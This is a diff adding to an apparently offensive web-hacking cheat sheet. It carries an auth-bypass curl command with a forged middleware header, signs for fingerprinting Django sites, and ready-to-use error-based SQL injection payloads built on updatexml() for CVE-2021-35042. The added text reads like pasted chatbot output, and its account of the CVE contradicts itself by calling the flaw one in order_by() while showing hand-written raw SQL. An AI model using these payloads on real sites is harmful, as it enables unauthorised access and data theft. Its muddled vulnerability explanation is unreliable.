@@ -101,3 +101,41 @@ curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:mi
 
 **Result:** Access protected routes (e.g., `/dashboard`) without login.
 
+
+Here is the **short note** for Django and CVE-2021-35042 – only what you need to know.
+
+
+## Django
+
+### Fingerprinting Django
+- **`Server: WSGIServer/0.2 CPython/...`** header  
+- **`csrftoken`** cookie  
+- **`X-Frame-Options: DENY`** + **`X-Content-Type-Options: nosniff`** together  
+- **`csrfmiddlewaretoken`** hidden field in POST forms (most reliable)  
+- Admin panel at `/admin/` (enabled by default)
+
+
+### CVE-2021-35042 – SQL Injection in `order_by()` (CVSS 9.8 Critical)
+
+**What it is:**  
+Django’s `order_by()` method concatenates user input directly into an `ORDER BY` clause when developers bypass the ORM and write raw SQL.
+
+**Vulnerable pattern (example from text):**
+```python
+order = request.GET.get('order', 'name')
+sql = f'... ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
+```
+
+**Attack vector:**  
+Parameter `?order=` in the URL.
+
+**Exploitation technique (MySQL with `DEBUG = True`):**  
+Use `updatexml()` to leak data via error messages.
+
+**Payloads:**
+1. Get MySQL version:  
+   `?order=updatexml(1,concat(0x7e,(select @@version)),1)`
+2. Get database name:  
+   `?order=updatexml(1,concat(0x7e,(select database())),1)`
+
+
